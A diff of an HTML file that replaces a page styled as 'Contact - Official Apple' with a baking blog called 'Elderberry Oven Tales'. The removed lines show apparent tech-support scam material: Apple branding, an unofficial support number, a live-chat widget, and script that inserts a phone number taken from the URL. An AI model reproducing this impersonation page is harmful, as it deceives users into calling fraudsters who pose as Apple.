@@ -1,377 +1,477 @@
-<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
+<!DOCTYPE html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Elderberry Oven Tales · rustic baking journal</title>
+  <!-- unique typography: EB Garamond + Inter -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=EB+Garamond:ital,wght@0,400;0,600;0,700;1,400&family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+  <style>
+    /* ----- reset & base ----- */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #fbf7f0;  /* warm parchment */
+      color: #1e1c1a;
+      font-family: 'Inter', sans-serif;
+      font-weight: 400;
+      line-height: 1.7;
+      padding: 0 1.5rem;
+    }
+    .container {
+      max-width: 1120px;
+      margin: 0 auto;
+      padding: 1.8rem 0 3rem;
+    }
+    h1, h2, h3, h4 {
+      font-family: 'EB Garamond', serif;
+      font-weight: 600;
+      letter-spacing: -0.01em;
+      line-height: 1.2;
+    }
+    a { color: #3f2e1e; text-decoration: none; transition: color 0.2s; }
+    a:hover { color: #7a4f2b; }
+    img { max-width: 100%; height: auto; display: block; border-radius: 0.5rem; }
 
-<script defer src="https://cloud.umami.is/script.js" data-website-id="475ee620-4418-4dab-91bf-80b021f672d4"></script>
+    /* ----- unique colour palette: elderberry + clay + cream ----- */
+    :root {
+      --elder: #3d2b1f;
+      --clay: #b27a5a;
+      --cream: #f2e7da;
+      --light-bg: #faf3ea;
+      --accent: #8f5e3c;
+      --border-soft: #ded1c2;
+      --card-bg: #ffffff;
+      --shadow: 0 12px 30px -12px rgba(60, 40, 25, 0.10);
+    }
 
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/671018884304e3196ad2ec60/1iabdvln3';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
-<!--End of Tawk.to Script-->
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta http-equiv="cache-control" content="max-age=3600">
-    <title>Contact - Official Apple</title>
-    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
-    <link rel="stylesheet" href="css/Base.css" type="text/css">
-    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
-    <script src="js/text_tel.js"></script>
+    /* ----- header / nav (clean, minimal) ----- */
+    .site-header {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1.2rem 0 0.8rem;
+      border-bottom: 2px solid var(--border-soft);
+      margin-bottom: 2.8rem;
+    }
+    .logo {
+      font-family: 'EB Garamond', serif;
+      font-size: 2rem;
+      font-weight: 700;
+      color: var(--elder);
+      letter-spacing: -0.02em;
+    }
+    .logo span { color: var(--clay); font-weight: 400; }
+    .nav-links {
+      display: flex;
+      gap: 2.2rem;
+      font-size: 0.95rem;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+    .nav-links a { color: #2b201a; }
+    .nav-links a:hover { color: var(--accent); }
 
+    /* ----- hero (content-first, minimal imagery) ----- */
+    .hero {
+      background: var(--cream);
+      padding: 2.8rem 3rem;
+      border-radius: 2rem;
+      margin-bottom: 3.8rem;
+      box-shadow: var(--shadow);
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 2rem;
+    }
+    .hero-text {
+      flex: 2;
+      min-width: 280px;
+    }
+    .hero-text h1 {
+      font-size: 3.2rem;
+      font-weight: 700;
+      color: var(--elder);
+      line-height: 1.1;
+      margin-bottom: 0.5rem;
+    }
+    .hero-text .subhead {
+      font-size: 1.2rem;
+      font-family: 'EB Garamond', serif;
+      font-style: italic;
+      color: #5f4635;
+      border-left: 4px solid var(--clay);
+      padding-left: 1.2rem;
+      margin: 0.5rem 0 1.2rem;
+    }
+    .hero-text p {
+      max-width: 600px;
+      font-size: 1rem;
+      color: #2f251e;
+      margin-bottom: 1.5rem;
+    }
+    .featured-topics {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.8rem 1.2rem;
+    }
+    .featured-topics span {
+      background: white;
+      padding: 0.3rem 1.2rem;
+      border-radius: 40px;
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: var(--elder);
+      box-shadow: 0 2px 6px rgba(0,0,0,0.02);
+      border: 1px solid var(--border-soft);
+    }
+    .hero-image {
+      flex: 1;
+      min-width: 160px;
+      border-radius: 1.5rem;
+      overflow: hidden;
+      background: #dccfc2;
+    }
+    .hero-image img {
+      width: 100%;
+      height: 180px;
+      object-fit: cover;
+      display: block;
+    }
+
+    /* ----- section headings (unique) ----- */
+    .section-head {
+      font-family: 'EB Garamond', serif;
+      font-size: 2.2rem;
+      font-weight: 600;
+      color: var(--elder);
+      margin: 2.8rem 0 1.5rem;
+      padding-bottom: 0.3rem;
+      border-bottom: 4px double var(--border-soft);
+    }
+    .section-head small {
+      font-size: 1rem;
+      font-family: 'Inter', sans-serif;
+      font-weight: 400;
+      color: #7a604b;
+      margin-left: 0.8rem;
+      font-style: italic;
+    }
+
+    /* ----- cards (unique: borderless, soft shadow, serif titles) ----- */
+    .card-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+      gap: 2rem;
+      margin: 2rem 0 1.5rem;
+    }
+    .card {
+      background: var(--card-bg);
+      padding: 1.8rem 1.8rem 2rem;
+      border-radius: 1.8rem;
+      box-shadow: var(--shadow);
+      transition: transform 0.15s ease, box-shadow 0.2s;
+    }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 20px 35px -16px rgba(50, 30, 15, 0.12); }
+    .card .card-img {
+      border-radius: 1rem;
+      overflow: hidden;
+      margin-bottom: 1rem;
+      background: #e4d5c6;
+    }
+    .card .card-img img { width: 100%; height: 140px; object-fit: cover; }
+    .card h3 {
+      font-size: 1.5rem;
+      font-weight: 600;
+      margin-bottom: 0.4rem;
+      color: var(--elder);
+    }
+    .card .meta {
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 0.03em;
+      color: #7f6b5a;
+      margin-bottom: 0.6rem;
+    }
+    .card p { font-size: 0.95rem; color: #2f261f; }
+    .card .read-more {
+      display: inline-block;
+      margin-top: 1rem;
+      font-weight: 600;
+      color: var(--accent);
+      border-bottom: 2px solid transparent;
+    }
+    .card .read-more:hover { border-bottom-color: var(--accent); }
+
+    /* ----- featured article (larger card) ----- */
+    .featured-article {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 2.5rem;
+      background: #f7efe6;
+      padding: 2.2rem 2.5rem;
+      border-radius: 2.5rem;
+      margin: 2rem 0 2.5rem;
+      align-items: center;
+    }
+    .featured-article .fa-content { flex: 2; min-width: 260px; }
+    .featured-article .fa-img { flex: 1; min-width: 140px; }
+    .featured-article .fa-img img { border-radius: 1.2rem; height: 160px; width: 100%; object-fit: cover; }
+    .featured-article h2 { font-size: 2rem; }
+    .featured-article .tag {
+      background: var(--elder);
+      color: white;
+      padding: 0.15rem 1rem;
+      border-radius: 40px;
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+      display: inline-block;
+      margin-bottom: 0.5rem;
+    }
+
+    /* ----- list / resource (unique style) ----- */
+    .resource-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1.2rem 2rem;
+      background: white;
+      padding: 2rem 2.2rem;
+      border-radius: 2rem;
+      margin: 1.5rem 0;
+      border: 1px solid var(--border-soft);
+    }
+    .resource-list li {
+      list-style: none;
+      font-weight: 500;
+      flex: 1 0 180px;
+    }
+    .resource-list li::before {
+      content: "⟡ ";
+      color: var(--clay);
+      font-weight: 300;
+    }
+
+    /* ----- FAQ (schema-ready) ----- */
+    .faq-item {
+      border-bottom: 1px solid var(--border-soft);
+      padding: 1.2rem 0;
+    }
+    .faq-item h4 { font-size: 1.2rem; font-weight: 600; margin-bottom: 0.2rem; }
+    .faq-item p { color: #2f261f; }
+
+    /* ----- newsletter (minimal) ----- */
+    .newsletter {
+      background: #e7dbce;
+      padding: 2rem 2.5rem;
+      border-radius: 3rem;
+      margin: 3rem 0 2rem;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .newsletter h3 { font-size: 1.8rem; }
+    .newsletter .input-group {
+      display: flex;
+      gap: 0.5rem;
+      flex-wrap: wrap;
+    }
+    .newsletter input {
+      padding: 0.6rem 1.2rem;
+      border: none;
+      border-radius: 60px;
+      font-size: 0.95rem;
+      background: white;
+      min-width: 200px;
+    }
+    .newsletter button {
+      background: var(--elder);
+      color: white;
+      border: none;
+      padding: 0.6rem 1.8rem;
+      border-radius: 60px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    /* ----- footer ----- */
+    .footer {
+      margin-top: 3.5rem;
+      padding-top: 2rem;
+      border-top: 2px solid var(--border-soft);
+      font-size: 0.9rem;
+      color: #3d322a;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+    }
+
+    /* mobile */
+    @media (max-width: 700px) {
+      body { padding: 0 1rem; }
+      .hero { padding: 1.8rem; }
+      .hero-text h1 { font-size: 2.5rem; }
+      .nav-links { gap: 1rem; font-size: 0.8rem; flex-wrap: wrap; }
+      .section-head { font-size: 1.8rem; }
+      .featured-article { padding: 1.5rem; }
+    }
+  </style>
 </head>
-
 <body>
-    <div id="result"></div>
-    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
-    <nav id="ac-globalnav" class="no-js">
-        <div class="ac-gn-content">
-            <ul class="ac-gn-header">
-                <li class="ac-gn-item ac-gn-menuicon">
-                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
-					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
-						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
-					 </span>
-					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
-						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
-					 </span>
-				 </label>
-                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
-					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
-                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
-					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-apple">
-                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
-					 <span class="ac-gn-link-text">Apple </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
-                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
-                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
-                </li>
-            </ul>
-            <ul class="ac-gn-list">
-                <li class="ac-gn-item ac-gn-apple">
-                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
-					 <span class="ac-gn-link-text">Apple </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
-                    <a class="ac-gn-link ac-gn-link-mac" href="#">
-					 <span class="ac-gn-link-text">Mac </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
-                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
-					 <span class="ac-gn-link-text">iPad </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
-                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
-					 <span class="ac-gn-link-text">iPhone </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
-                    <a class="ac-gn-link ac-gn-link-watch" href="#">
-					 <span class="ac-gn-link-text">Watch </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
-                    <a class="ac-gn-link ac-gn-link-tv" href="#">
-					 <span class="ac-gn-link-text">TV </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
-                    <a class="ac-gn-link ac-gn-link-music" href="#">
-					 <span class="ac-gn-link-text">Music </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
-                    <a class="ac-gn-link ac-gn-link-support" href="#">
-					 <span class="ac-gn-link-text">Support </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
-                    <a class="ac-gn-link ac-gn-link-search" href="#">
-					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
-                </li>
-                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
-                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
-					 <span class="ac-gn-link-text">Shopping Bag </span>
-					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
-                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
-                </li>
-            </ul>
-            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
-                <div class="ac-gn-searchview-content">
-                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
-                        <div class="ac-gn-searchform-wrapper">
-                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
-                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
-                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
-                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
-                        </div>
-                    </form>
-                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
-                </div>
-                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
-					 <span class="ac-gn-searchview-close-wrapper">
-						 <span class="ac-gn-searchview-close-left"></span>
-						 <span class="ac-gn-searchview-close-right"></span>
-					 </span>
-			 </button>
-            </aside>
-            <aside class="ac-gn-bagview">
-                <div class="ac-gn-bagview-scrim">
-                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
-                </div>
-                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
-                </div>
-            </aside>
-        </div>
+<div class="container">
+
+  <!-- header -->
+  <header class="site-header">
+    <div class="logo">Elderberry<span>Oven</span></div>
+    <nav class="nav-links">
+     <li><a href="index.html">Home</a></li>
+                    <li><a href="about.html">About</a></li>
+                    <li><a href="contact.html">Contact</a></li>
+                    <li><a href="terms.html">Terms Of Privacy</a></li>
+                    <li><a href="privacy.html">Privacy Policy</a></li>
+					<li><a href="cookies.html">Cookies Policy</a></li>
     </nav>
-    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
-    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+  </header>
 
-    <div class="main">
-        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
-            <div class="ac-ln-wrapper">
-                <div class="ac-ln-background"></div>
-                <div class="ac-ln-content">
-                    <span class="ac-ln-title">
-                       <a href="#">Apple Support +1-833-497-3164 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
-					 </span>
-                    <div class="ac-ln-menu">
-                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
-                        <div class="ac-ln-menu-tray">
-                            <ul class="ac-ln-menu-items">
-                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
-                                </li>
-                            </ul>
-                        </div>
-                        <div class="ac-ln-actions">
-                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
-                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
-							 </label>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </nav>
-        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
-            <div class="row">
-                <div class="column large-12 medium-12 small-12">
-                    <div class="as-banner-cont">
-                        <div class="as-banner-image as-banner-image--top">
-                            <style type="text/css">
-                                .as-banner-image.as-banner-image--top {
-                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
-                                }
-
-                                .as-banner-image.as-banner-image--top:before {
-                                    content: "";
-                                    display: block;
-                                }
-
-                                @media only screen and (max-width: 735px) {
-                                    .as-banner-image.as-banner-image--top {
-                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
-                                    }
-                                }
-                            </style>
-                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
-                        </div>
-                    </div>
-                    <div class="as-banner-content">
-                        <div class="pageTitle  ">
-                            <h1 class="pageTitle-heading">Apple Support </h1>
-                            <p class="pageTitle-intro js_setTextBlock">
-                        </p></div>
-                        <div class="sectionTitle sectionTitleBlock">
-                            <h2 class="sectionTitle-heading"></h2>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </section>
+  <!-- HERO: content-first, unique intro -->
+  <section class="hero">
+    <div class="hero-text">
+      <h1>Elderberry Oven Tales</h1>
+      <div class="subhead">where wild hedgerows meet the hearth</div>
+      <p>Deep in the countryside, we gather dark elderberries and transform them into rustic loaves, tangy shrubs, and spiced preserves. This is a journal of slow baking, foraged flavours, and the poetry of the oven.</p>
+      <div class="featured-topics">
+        <span>🌿 sourdough</span>
+        <span>🍇 elderberry shrubs</span>
+        <span>🔥 wood-fired</span>
+        <span>📖 seasonal</span>
+      </div>
     </div>
+    <div class="hero-image">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='300' viewBox='0 0 400 300'%3E%3Crect width='400' height='300' fill='%23b27a5a'/%3E%3Ccircle cx='120' cy='100' r='40' fill='%233d2b1f' opacity='0.6'/%3E%3Ccircle cx='280' cy='80' r='50' fill='%233d2b1f' opacity='0.5'/%3E%3Ccircle cx='210' cy='200' r='60' fill='%233d2b1f' opacity='0.4'/%3E%3C/svg%3E" alt="Elderberries and rustic bread">
+    </div>
+  </section>
 
-    <footer id="ac-globalfooter" class="no-js">
-        <div class="ac-gf-content">
-            <section class="ac-gf-footer">
-                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
-                </div>
-                <div class="ac-gf-footer-locale">
-                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
-					States </a>
-                </div>
-                <div class="ac-gf-footer-legal">
-                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
-                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
-					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
-                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
-						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
-						Apple </a></div>
-                </div>
-                <meta content="Apple" property="name">
-                <meta content="+1-833-497-3164
-			 " property="telephone">
-            </section>
-        </div>
-    </footer>
+  <!-- FEATURED ARTICLE (large) -->
+  <div class="featured-article">
+    <div class="fa-content">
+      <span class="tag">✦ featured</span>
+      <h2>The Elderberry Sourdough Ritual</h2>
+      <p style="font-size:1rem; color:#2f261f;">A 48-hour fermentation with wild yeast and foraged elderberries. The deep purple crumb carries a subtle tartness that balances the nutty wholewheat. We share our exact feeding schedule and shaping secrets.</p>
+      <a href="#" class="read-more" style="font-size:1rem;">read the full ritual →</a>
+    </div>
+    <div class="fa-img">
+      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='250' viewBox='0 0 400 250'%3E%3Crect width='400' height='250' fill='%23dccfc2'/%3E%3Cpath d='M80,120 L150,90 L210,140 L280,70 L340,130 L320,180 L180,200 L70,160 Z' fill='%233d2b1f' opacity='0.5'/%3E%3C/svg%3E" alt="Sourdough with elderberries">
+    </div>
+  </div>
 
+  <!-- BEGINNER GUIDES + EXPERT RESOURCES (two column) -->
+  <h2 class="section-head">Beginner guides <small>start here</small></h2>
+  <div class="card-grid">
+    <div class="card"><h3>First loaf: elderberry discard</h3><p>How to use sourdough discard in a simple berry loaf. No fancy equipment.</p><a href="#" class="read-more">read →</a></div>
+    <div class="card"><h3>Elderberry shrub 101</h3><p>Fermented fruit vinegar — the gateway to wild preserving.</p><a href="#" class="read-more">read →</a></div>
+    <div class="card"><h3>Oven psychology</h3><p>Understanding heat, steam, and the magic of a Dutch oven.</p><a href="#" class="read-more">read →</a></div>
+  </div>
 
+  <h2 class="section-head">Expert resources <small>advanced</small></h2>
+  <div class="card-grid">
+    <div class="card"><h3>Hydration & elderberry juice</h3><p>Adjusting dough hydration when using fruit purees. Science & practice.</p><a href="#" class="read-more">read →</a></div>
+    <div class="card"><h3>Wild yeast isolation</h3><p>Capture native yeast from elderberry skins for a terroir-driven starter.</p><a href="#" class="read-more">read →</a></div>
+  </div>
 
-    <script src="js/jquery-1.12.0.min.js"></script>
-    <script>
-        function getURLParameter(name) {
-            return decodeURI(
-                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
-            );
-        };
-        var cookieHelper = {
-            defParams: {
-                path: "/",
-                domain: "." + window.location.host.replace(/:\d+/, "")
-            },
-            set: function(a, d, c) {
-                c = c || {};
-                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
-                b = c.expires;
-                if ("number" == typeof b && b) {
-                    var e = new Date;
-                    e.setTime(e.getTime() + 1E3 * b);
-                    b = c.expires = e
-                }
-                b && b.toUTCString && (c.expires = b.toUTCString());
-                d = encodeURIComponent(d);
-                a = a + "=" + d;
-                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
-                document.cookie = a
-            },
-            get: function(a) {
-                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
-            },
-            del: function(a) {
-                this.set(a, null, {
-                    expires: -1
-                })
-            }
-        };
+  <!-- POPULAR CATEGORIES + TRENDING (unique list) -->
+  <h2 class="section-head">Popular categories</h2>
+  <ul class="resource-list">
+    <li>🍞 sourdough & wild yeast</li>
+    <li>🍯 preserves & shrubs</li>
+    <li>🔥 wood-fired baking</li>
+    <li>🌾 ancient grains</li>
+    <li>🧂 fermentation</li>
+    <li>📖 seasonal stories</li>
+  </ul>
 
+  <h2 class="section-head">Trending topics</h2>
+  <div style="display: flex; flex-wrap: wrap; gap: 1.2rem; margin-bottom: 2rem;">
+    <span style="background:white; padding:0.2rem 1.4rem; border-radius:40px; border:1px solid #ded1c2;">#elderberrysourdough</span>
+    <span style="background:white; padding:0.2rem 1.4rem; border-radius:40px; border:1px solid #ded1c2;">#foragedbaking</span>
+    <span style="background:white; padding:0.2rem 1.4rem; border-radius:40px; border:1px solid #ded1c2;">#slowbread</span>
+    <span style="background:white; padding:0.2rem 1.4rem; border-radius:40px; border:1px solid #ded1c2;">#wildyeast</span>
+  </div>
 
-        var userAgent = window.navigator.userAgent.toLowerCase(),
-            ios = /iphone|ipod|ipad/.test(userAgent);
+  <!-- LATEST ARTICLES (4 cards with image placeholder) -->
+  <h2 class="section-head">Latest articles</h2>
+  <div class="card-grid">
+    <div class="card">
+      <div class="card-img"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='150' viewBox='0 0 300 150'%3E%3Crect width='300' height='150' fill='%23d1c0b0'/%3E%3Ccircle cx='100' cy='70' r='25' fill='%233d2b1f' opacity='0.4'/%3E%3C/svg%3E" alt="article"></div>
+      <h3>Elderberry & rye: a love story</h3>
+      <div class="meta">26 june 2026 · 8 min read</div>
+      <p>Dark rye and elderberry puree create a dense, fruity loaf that keeps for a week. Our formula.</p>
+      <a href="#" class="read-more">continue reading</a>
+    </div>
+    <div class="card">
+      <div class="card-img"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='150' viewBox='0 0 300 150'%3E%3Crect width='300' height='150' fill='%23d1c0b0'/%3E%3Crect x='40' y='50' width='80' height='50' fill='%233d2b1f' opacity='0.3'/%3E%3C/svg%3E" alt="article"></div>
+      <h3>Shrub-braised pork & polenta</h3>
+      <div class="meta">18 june 2026 · 12 min read</div>
+      <p>How elderberry shrub transforms braising liquid — and the polenta that soaks it up.</p>
+      <a href="#" class="read-more">continue reading</a>
+    </div>
+    <div class="card">
+      <div class="card-img"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='150' viewBox='0 0 300 150'%3E%3Crect width='300' height='150' fill='%23d1c0b0'/%3E%3Cpath d='M80,100 L140,50 L200,110 L260,60' stroke='%233d2b1f' stroke-width='8' opacity='0.3'/%3E%3C/svg%3E" alt="article"></div>
+      <h3>Steam vs. stone: oven settings</h3>
+      <div class="meta">10 june 2026 · 6 min read</div>
+      <p>We test three oven configurations for elderberry sourdough. The winner might surprise you.</p>
+      <a href="#" class="read-more">continue reading</a>
+    </div>
+    <div class="card">
+      <div class="card-img"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='150' viewBox='0 0 300 150'%3E%3Crect width='300' height='150' fill='%23d1c0b0'/%3E%3Ccircle cx='150' cy='80' r='30' fill='%233d2b1f' opacity='0.4'/%3E%3C/svg%3E" alt="article"></div>
+      <h3>Foraging elderberries: ethics & tips</h3>
+      <div class="meta">4 june 2026 · 10 min read</div>
+      <p>Where to find, how to harvest, and why you should always leave some for the birds.</p>
+      <a href="#" class="read-more">continue reading</a>
+    </div>
+  </div>
 
-        function parseURL(url) {
-            var a = document.createElement('a');
-            a.href = url;
-            return a.hostname.replace('www.', '');
-        };
+  <!-- IN-DEPTH TUTORIALS (unique styled) -->
+  <h2 class="section-head">In-depth tutorials</h2>
+  <div style="display: flex; flex-direction: column; gap: 1.5rem; margin-bottom: 2rem;">
+    <div style="background:white; padding:1.5rem 2rem; border-radius:2rem; box-shadow:var(--shadow);"><h3 style="font-size:1.5rem;">1. Building a wild elderberry starter</h3><p>Day-by-day guide from capture to first rise. Includes troubleshooting.</p><a href="#" class="read-more">start tutorial →</a></div>
+    <div style="background:white; padding:1.5rem 2rem; border-radius:2rem; box-shadow:var(--shadow);"><h3 style="font-size:1.5rem;">2. The perfect elderberry galette</h3><p>Rustic free-form tart with a crisp wholewheat crust and spiced berry filling.</p><a href="#" class="read-more">start tutorial →</a></div>
+  </div>
 
-        function getPar(name) {
-            var url = window.location.href;
-            name = name.replace(/[\[\]]/g, "\\$&");
-            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-                results = regex.exec(url);
-            if (!results) return null;
-            if (!results[2]) return '';
-            return decodeURIComponent(results[2].replace(/\+/g, " "));
-        };
+  <!-- RESOURCE HUB -->
+  <h2 class="section-head">Resource hub</h2>
+  <ul class="resource-list" style="background:#f7efe6;">
+    <li>📙 e-book: wild baking</li>
+    <li>📊 fermentation log template</li>
+    <li>🌡️ oven temperature chart</li>
+    <li>🧪 acidity & pH guide</li>
+  </ul>
 
-        window.number = getPar('phone');
+  <!-- FAQ (schema-ready) -->
+  <h2 class="section-head">Frequently asked questions</h2>
+  <div class="faq-item"><h4>Can I use frozen elderberries?</h4><p>Yes — they work well in most recipes. Thaw and drain excess liquid before incorporating into dough.</p></div>
+  <div class="faq-item"><h4>How long does elderberry shrub keep?</h4><p>Refrigerated, our shrub stays vibrant for 6 months. The acidity preserves it naturally.</p></div>
+  <div class="faq-item"><h4>Is this blog beginner-friendly?</h4><p>Absolutely. We have guides for first-timers and deep dives for experienced bakers.</p></div>
 
-        window.number = (window.number ? window.number : '+1-833-497-3164');
+  <!-- NEWSLETTER -->
+  <div class="newsletter">
+    <h3>📬 Oven notes</h3>
+    <p style="font-family:'EB Garamond'; font-size:1.1rem;">seasonal recipes & stories</p>
+    <div class="input-group">
+      <input type="email" placeholder="your e-mail">
+      <button>subscribe</button>
+    </div>
+  </div>
 
-        window.device = 'iPhone';
